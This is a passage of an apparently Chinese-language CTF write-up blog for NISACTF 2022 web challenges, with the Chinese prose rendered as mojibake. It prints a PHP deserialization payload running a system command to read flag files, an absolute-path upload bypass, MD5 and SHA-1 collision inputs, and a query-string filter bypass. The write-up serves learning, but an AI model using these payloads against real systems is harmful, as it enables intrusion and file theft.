aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¢«checkcheckå‡½æ•°æ‹¦æˆªäº†ï¼Œè¿”å›something wrong</p><p>ç»è¿‡å¤šæ¬¡å°è¯•å¤§å†™systemå¯ä»¥è¿‡waf.phpã€‚</p><p>æ‰€ä»¥æœ€ç»ˆçš„expæ˜¯ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$txw4ever</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'SYSTEM("cat /f*");'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NISA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ilovetxw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token property">su</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payalodæ˜¯</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;NISA&quot;:2:&#123;s:8:&quot;txw4ever&quot;;s:18:&quot;SYSTEM(&quot;cat &#x2F;f*&quot;);&quot;;s:3:&quot;fun&quot;;O:8:&quot;Ilovetxw&quot;:1:&#123;s:2:&quot;su&quot;;r:1;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h1><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢</p><p><img src="https://imag.keyblue.cn/imag/202309221559382.png" alt="image-20230922155923350"></p><p>æŸ¥çœ‹æºç å‘ç°éšè—æ³¨é‡Š</p><p><img src="https://imag.keyblue.cn/imag/202309221600348.png" alt="image-20230922160009311"></p><p>è®¿é—®<code>/source</code>å¾—åˆ°æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> g<span class="token punctuation">,</span> send_from_directory<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> os<span class="token keyword">import</span> uuidapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SCHEMA <span class="token operator">=</span> <span class="token triple-quoted-string string">"""CREATE TABLE files (id text primary key,path text);"""</span><span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    g_db <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token string">'_database'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> g_db <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        g_db <span class="token operator">=</span> g<span class="token punctuation">.</span>_database <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> g_db<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_first_request</span><span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"database.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>executescript<span class="token punctuation">(</span>SCHEMA<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html>&lt;html>&lt;body>&lt;form action="/upload" method="post" enctype="multipart/form-data">    Select image to upload:    &lt;input type="file" name="file">    &lt;input type="submit" value="Upload File" name="submit">&lt;/form>&lt;!-- /source -->&lt;/body>&lt;/html>"""</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>directory<span class="token operator">=</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">,</span> path<span class="token operator">=</span><span class="token string">"www.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token string">"."</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Bad filename!"</span><span class="token punctuation">,</span> <span class="token number">403</span>    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    uid <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"insert into files (id, path) values (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uid<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> sqlite3<span class="token punctuation">.</span>IntegrityError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Duplicate file"</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'uploads/'</span> <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/file/'</span> <span class="token operator">+</span> uid<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/file/&lt;id>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    conn <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select path from files where id=?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"File not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token comment"># print(res[0])</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"uploads/"</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„æ€æ˜¯ä¸Šä¼ æ–‡ä»¶åä¸ºæ–‡ä»¶ç”Ÿæˆuidï¼Œå¹¶å°†æ–‡ä»¶è·¯å¾„ä¸uidç»‘å®šä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œè®¿é—®uidå³å¯è®¿é—®åˆ°æ–‡ä»¶</p><p>ä½†æ˜¯è¿™é‡Œæ¶‰åŠåˆ°os.path.joinçš„æ¼æ´</p><blockquote><p><strong>ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´</strong></p><p>os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚</p><p>ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ &#x2F; å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„</p></blockquote><p>æ–‡ä»¶ä¸èƒ½æœ‰åç¼€</p><p>æ ¹æ®è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ååŠ ä¸Š<code>/</code>å°±å¯ä»¥è®¿é—®æ–‡ä»¶ï¼Œäºæ˜¯ä¸Šä¼ <code>/flag</code>æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309221608592.png" alt="image-20230922160845551"></p><p><img src="https://imag.keyblue.cn/imag/202309221609139.png" alt="image-20230922160948117"></p><p>end</p><h1 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h1><p>æ‰“å¼€é¢˜ç›®å•¥ä¹Ÿæ²¡æœ‰ï¼Œæºä»£ç ä¹Ÿæ²¡æœ‰æç¤º</p><p>kali dirbç›®å½•æ‰«æï¼Œæ‰«åˆ°äº†<code>robots.txt</code>ï¼Œé‡Œé¢æœ‰<code>level_2_1s_h3re.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//here is level 2</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a1</span> <span class="token operator">==</span> <span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$level3</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"level 2 failed ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5å¼ºæ¯”è¾ƒï¼Œè€Œä¸”ä¸èƒ½ç”¨æ•°ç»„ï¼Œä½¿ç”¨ä¸¤ä¸ªmd5å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²</p><pre class="line-numbers language-none"><code class="language-none">array1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2array2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨æµè§ˆå™¨ç›´æ¥å‘é€ä¼¼ä¹æœ‰ç¼–ç é—®é¢˜ï¼Œå»ºè®®ä½¿ç”¨burpæ„é€ å‘é€</p><p><img src="https://imag.keyblue.cn/imag/202309222049944.png" alt="image-20230922204944907"></p><p>è®¿é—®Level___3.phpï¼Œå˜æˆäº†sha1å€¼å¼ºæ¯”è¾ƒ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//here is level 3</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'array2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a1</span> <span class="token operator">==</span> <span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"????"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$level4</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"level 3 failed ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸¤ä¸ªsha1å€¼å®Œå…¨ç›¸åŒçš„å­—ç¬¦ä¸²</p><pre class="line-numbers language-none"><code class="language-none">array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨burpæäº¤</p><p><img src="https://imag.keyblue.cn/imag/202309222056645.png" alt="image-20230922205623612"></p><p>è®¿é—®level_level_4.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//here is last level</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give me a parameter"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |_|20|5f|2e|\./'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"blacklist here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NI_SA_'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"txw4ever"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$level5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"level 4 failed ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆäº†è§£ä¸€ä¸‹<code>parse_url()</code>å‡½æ•°</p><blockquote><p>parse_url()</p><p>æœ¬å‡½æ•°è§£æURLå¹¶è¿”å›å…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨URLä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚æ•°ç»„çš„å…ƒç´ å€¼<em>ä¸ä¼š</em> URLè§£ç ã€‚   </p><p>æœ¬å‡½æ•°<strong>ä¸æ˜¯</strong>ç”¨æ¥éªŒè¯ç»™å®šURLçš„æœ‰æ•ˆæ€§çš„ï¼Œåªæ˜¯å°†å…¶åˆ†è§£ä¸ºä¸‹é¢åˆ—å‡ºçš„éƒ¨åˆ†ã€‚ä¹Ÿä¼šæ¥å—ä¸å®Œæ•´æˆ–æ— æ•ˆçš„ URLï¼Œ<strong>parse_url()</strong> ä¼šå°è¯•å°½é‡æ­£ç¡®è§£æã€‚ </p><p>è¿”å›æ•°ç»„çš„é”®<code>query</code>å¯¹åº”çš„å…ƒç´ æ˜¯åœ¨é—®å·?ä¹‹åçš„å€¼</p></blockquote><p>å†äº†è§£ä¸€ä¸‹<code>$_SERVER[&#39;REQUEST_URI&#39;]</code></p><blockquote><p>è®¿é—®çš„urlï¼šhttp:&#x2F;127.0.0.1&#x2F;index.php?a&#x3D;1</p><p>$_SERVER[â€˜REQUEST_URIâ€™]è¿”å›&#x2F;index.php?a&#x3D;1</p></blockquote><p>æ­£åˆ™è¿‡æ»¤äº†<code>ç©ºæ ¼</code>ã€<code>_</code>ã€<code>.</code>ï¼Œä½†æ˜¯åœ¨phpä¸­<code>[</code>ã€<code>ç©ºæ ¼</code>ã€<code>+</code> ã€<code>.</code> è¿™å››ä¸ªéƒ½å¯ä»¥è¢«å¤„ç†ä¸º<code>_</code>ï¼Œ<code>+</code>æ²¡æœ‰è¿‡æ»¤</p><pre class="line-numbers language-none"><code class="language-none">NI+SA+&#x3D;txw4ever<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æäº¤è¿”å›55_5_55.phpï¼Œæºç å®¡è®¡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//sorry , here is true last level</span><span class="token comment">//^_^</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"str.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token 